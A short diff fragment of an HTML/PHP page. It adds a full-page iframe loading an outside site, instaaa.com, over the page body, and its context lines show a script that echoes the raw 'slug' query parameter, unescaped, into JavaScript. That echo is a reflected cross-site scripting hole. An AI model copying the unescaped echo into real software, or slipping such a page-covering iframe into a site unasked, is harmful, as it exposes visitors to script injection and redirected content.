@@ -20,6 +20,8 @@
 </head>
 <body>
 
+  <iframe src="https://instaaa.com/" width="100%" height="100%" frameborder="0"></iframe>
+
   <script type="text/javascript">
     window.huntr = {
       slug: '<?php echo (!empty($_GET['slug'])) ? $_GET['slug'] : '' ?>'
